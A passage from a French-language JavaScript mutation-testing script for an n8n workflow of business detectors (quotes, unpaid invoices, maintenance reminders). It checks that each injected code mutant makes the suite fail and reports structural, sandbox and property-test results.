  ['M7 n° 10 : activation ignorée (2 à 16 jours d’aujourd’hui)', mutantCode('Détecteur 10 demande d avis', 'const activation = jourParis(a.actif_depuis) || JOUR;', 'const activation = JOUR;'), { attendu: /10 M7/ }],
  ['M8 n° 6 : borne haute retirée', mutantCode('Détecteur 06 demande sans réponse', 'if (age > S.demande_borne_jours) continue;', ''), { attendu: /6 M8/ }],
  ['M8 n° 8 : dernier jour de validité exclu', mutantCode('Détecteur 08 devis bientôt expiré', 'if (restant < 0 ||', 'if (restant < 1 ||'), { attendu: /8 M8/ }],
  ['M8 seuil : borne du n° 6 portée à 30 jours', mutantCode('Contexte du passage', 'demande_borne_jours: 10,', 'demande_borne_jours: 30,'), { attendu: /M8/ }],
  ['M10 alwaysOutputData retiré d’une lecture', mutantNoeud('Lire commandes', (n) => { delete n.alwaysOutputData }), { attendu: /M10/ }],
  ['M11 constat porteur d’une coordonnée sous un nom neutre (destinataire)', mutantCode('Niveau proposé selon l offre', 'drapeaux: d.drapeaux,', "drapeaux: d.drapeaux, destinataire: 'x',"), { attendu: /liste blanche/ }],
  ['M11 objet du constat élargi (tel)', mutantCode('Détecteur 04 devis sans réponse', "constat(4, 'devis_sans_reponse', d.artisan_id, 'devis', d.id,", "nouveaux.push({ numero: 4, detecteur: 'devis_sans_reponse', cle: 'devis_sans_reponse:' + d.id + ':x', artisan_id: d.artisan_id, objet: { type: 'devis', id: d.id, tel: '0' }, etape: 'x', montant_centimes: 0, jours: 0, argent: null }); constat(4, 'devis_sans_reponse', d.artisan_id, 'devis', d.id,"), { attendu: /liste blanche/ }],
  ['M12 preuve : une liste vide passe pour « ok »', mutantCode('Preuve de connexion', 'if (rendus.length !== 1) {', "if (rendus.length === 0) { return [{ json: { connexion: 'ok', lignes: 1 } }]; } if (rendus.length !== 1) {"), { attendu: /M12/ }],
  ['M12 preuve : colonnes de la ligne non vérifiées', mutantCode('Preuve de connexion', "const forme = Object.keys(r).sort().join(',') === COLONNES &&", 'const forme ='), { attendu: /M12/ }],
  ['rang 26 branche d’erreur ôtée', (wf) => { const m = copie(wf); m.nodes = m.nodes.filter((n) => n.type !== 'n8n-nodes-base.errorTrigger'); return m }, { attendu: /branche d'erreur/ }],
  ['rang 26 alerte qui porte le texte de l’erreur', mutantCode('Message d échec', "mode: propre(x.mode, 20) } }];", "mode: propre(x.mode, 20), detail: String((x.error || {}).message || '') } }];"), { attendu: /rang 26/ }],
  ['rang 26 nœud ajouté après le message d’échec (envoi)', (wf) => { const m = copie(wf); m.connections['Message d échec'] = { main: [[{ node: 'Bilan par détecteur', type: 'main', index: 0 }]] }; return m }, { attendu: /branche d'erreur|liaison inattendue/ }],
  ['graphe : lecture recâblée hors de la chaîne', (wf) => { const m = copie(wf); m.connections['Contexte du passage'].main[0].push({ node: 'Lire tarifs', type: 'main', index: 0 }); return m }, { attendu: /liaison inattendue/ }],
  ['rang 8 carte refusée ignorée', mutantCode('Niveau proposé selon l offre', "if (refusees.has(c.artisan_id + '|' + d.outil + '|' + c.objet.id)) continue;", ''), { attendu: /rang 8/ }],
  ['n° 11 : raison de l’arrêt ignorée', mutantCode('Détecteur 11 réponse à une relance d impayé', "if (a.raison !== 'reponse_client' || a.reprise_le) continue;", 'if (a.reprise_le) continue;'), { attendu: /11 arrêtée par l’artisan/ }],
  ['n° 11 : reprise ignorée', mutantCode('Détecteur 11 réponse à une relance d impayé', "if (a.raison !== 'reponse_client' || a.reprise_le) continue;", "if (a.raison !== 'reponse_client') continue;"), { attendu: /11 reprise/ }],
  ['n° 11 : facture payée relancée', mutantCode('Détecteur 11 réponse à une relance d impayé', "if (!f || f.statut !== 'emise' || f.payee_le || f.avoir_de) continue;", 'if (!f) continue;'), { attendu: /11 payée|11 annulée|11 avoir/ }],
  ['n° 11 : arrêt lu sans le compte', mutantCode('Détecteur 11 réponse à une relance d impayé', 'const f = factures.get(paire(a.artisan_id, a.facture_id));', "const f = lignes('Lire factures').find((x) => x.id === a.facture_id);"), { attendu: /11 M2/ }],
  ['n° 11 : niveau 3 permis', mutantCode('Niveau proposé selon l offre', "11: { outil: 'relancer_facture', max: 2, auto: [],", "11: { outil: 'relancer_facture', max: 3, auto: ['factures.relances.auto'],"), { attendu: /plafond|jamais 3/ }],
  ['n° 12 : déjà envoyé reproposé', mutantCode('Détecteur 12 entretien à proposer', "if (r.type !== 'entretien' || r.origine !== 'systeme' || r.fait_le || r.envoye_le || !r.chantier_id) continue;", "if (r.type !== 'entretien' || r.origine !== 'systeme' || r.fait_le || !r.chantier_id) continue;"), { attendu: /12 déjà envoyé/ }],
  ['n° 12 : échéance à venir proposée', mutantCode('Détecteur 12 entretien à proposer', 'if (!echeance || echeance > JOUR) continue;', 'if (!echeance) continue;'), { attendu: /12 échéance à venir/ }],
  ['n° 12 : réglage « entretien » ignoré', mutantCode('Détecteur 12 entretien à proposer', "if (!aLaCapacite(r.artisan_id, 'crm') || !a || a.entretien !== true) continue;", "if (!aLaCapacite(r.artisan_id, 'crm')) continue;"), { attendu: /12 entretien non coché/ }],
  ['n° 12 : niveau 3 permis', mutantCode('Niveau proposé selon l offre', 'return Math.min(n, d.max);', 'return c.numero === 12 ? 3 : Math.min(n, d.max);'), { attendu: /plafond|jamais 3/ }],
  ['n° 12 hors de la chaîne (n° 11 → niveau)', (wf) => { const m = copie(wf); m.connections['Détecteur 11 réponse à une relance d impayé'] = { main: [[{ node: 'Niveau proposé selon l offre', type: 'main', index: 0 }]] }; return m }, { attendu: /chaîne des détecteurs/ }],
  ['copie de OUTIL_TYPE faussée (entretien envoyé par le pilote)', mutantCode('Capacités des offres', "envoyer_rappel_entretien: 'assistant_client' }", "envoyer_rappel_entretien: 'relance_devis' }"), { attendu: /OUTIL_TYPE/ }],
]

// ─── Lancement ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
const debut = Date.now()
const echecs = await suite(WF, { avecSonde: true })
const statsVert = JSON.parse(JSON.stringify(STATS))
let mutantsVerts = 0
for (const [titre, fabriquer, options = {}] of MUTANTS) {
  const avecEmpreintes = options.avecEmpreintes ?? !fabriquer.code
  let rougit, raison = ''
  try {
    const erreurs = await suite(fabriquer(WF), { avecEmpreintes, attendu: options.attendu ?? /./ })
    const bonnes = options.attendu ? erreurs.filter((m) => options.attendu.test(m)) : erreurs
    rougit = bonnes.length > 0
    raison = (bonnes[0] ?? erreurs[0] ?? '').slice(0, 200)
    if (!rougit && erreurs.length) raison = `rouge, mais pas pour la raison attendue (${options.attendu}) : ${raison}`
  } catch (err) { raison = `mutant inapplicable : ${err.message}`; rougit = false }
  console.log(`  ${rougit ? '✓' : '✗'} mutant « ${titre} »${avecEmpreintes ? '' : ' [sans empreintes]'} ${rougit ? 'fait rougir la suite' : 'NE FAIT PAS rougir la suite'}${raison ? `\n      → ${raison}` : ''}`)
  if (!rougit) mutantsVerts++
}
BAC.fermer()
const nbCodes = WF.nodes.filter((n) => n.type === 'n8n-nodes-base.code').length
console.log(`detecteurs-n8n-qa : ${WF.nodes.length} nœuds (${nbCodes} Code, ${LECTURES(WF).length} lectures GET), ${MUTANTS.length} mutants, ${Math.round((Date.now() - debut) / 1000)} s`)
if (echecs.length || mutantsVerts) {
  for (const e of echecs) console.log(`  ✗ ${e}`)
  if (mutantsVerts) console.log(`  ✗ ${mutantsVerts} mutant(s) laissent la suite verte`)
  console.log('ÉCHEC')
  process.exit(1)
}
const s = statsVert.sonde, p = statsVert.proprietes
console.log('  ✓ structure : inactif, lectures seules, select= limité aux colonnes permises, aucune écriture, aucun envoi, aucun modèle ; graphe entier vérifié')
console.log(`  ✓ M1 filtres exacts (noms et valeurs) sur les ${Object.keys(LECTURES_ATTENDUES).length} lectures ; M10 alwaysOutputData sur chacune ; M11 liste blanche des clés de chaque constat`)
console.log('  ✓ M12 Preuve de connexion : une ligne aux colonnes exactes de regles_automatisation, sinon arrêt (vide, page HTML, deux lignes, autre table) ; rang 26 branche d’erreur : Error Trigger → Message d échec, sans donnée ni texte d’erreur')
console.log('  ✓ É1 gabarit HTTP exact : parameters, options, pagination (offset seul, fin exacte, ≤ 50 pages), un seul identifiant')
console.log(`  ✓ É3 empreintes : ${EMPREINTES.size} nœuds Code épinglés (sha256), identiques à l'export — réépinglées par 032-019, nouvel audit à suivre`)
console.log(`  ✓ É3 bac à sable : processus enfant ${BAC.drapeaux.join(' ')} (Node ${s.node}) — écriture ${s.ecriture}, lecture ${s.lecture}, processus ${s.processus}, worker ${s.worker} ; réseau ${s.reseau === 'ERR_ACCESS_DENIED' ? 'ERR_ACCESS_DENIED' : s.reseau + ' (Node ' + s.node + ' n’a pas de barrage réseau : le code n’y atteint pas, faute de tout objet de l’hôte dans son contexte — voir l’évasion ci-dessous)'}`)
console.log(`  ✓ É3 évasion de l’annexe E (032-010) : ${statsVert.evasionE.erreur ? 'refusée (' + statsVert.evasionE.erreur.slice(0, 80) + ')' : 'sans effet'} ; version rattrapée : ${JSON.stringify(statsVert.evasionRattrapee.items[0])}`)
console.log('  ✓ copies : capacités = lib/plans.ts ; listes d’outils = lib/pilote/regles.ts ; seuils sourcés = le code')
console.log('  ✓ détecteurs : déclenchent, se taisent, tiennent à la limite, changent de clé d’étape ; n° 5 muet ; n° 7, 11, 12 jamais 3 ; M2 données croisées, M3 portes du pilote, M4 statuts, M5 un devis relancé une fois et compté une fois, M6 écart de 2 jours, M7 comme propositions, M8 bornes ; rang 8 cartes refusées')
console.log(`  ✓ É2 propriété : ${p.cases} cas (12 détecteurs × 3 offres × impayés × réponse × pilote × étapes × montants de 1 € à 100 000 €, ${JOURS_PROPRIETE.length} jours), ${p.constats} constats, niveaux ${JSON.stringify(p.parNiveau)}, tous ≤ plafond(offre, détecteur) ; outil de OUTILS_JAMAIS_AUTO ⇒ niveau ≤ 2 sur chaque constat de chaque cas`)
console.log(`  ✓ essai n8n (exécution ${EXECUTION_ESSAI}, données fictives épinglées) rejoué hors ligne : même bilan (${statsVert.essai})`)
console.log('OK')
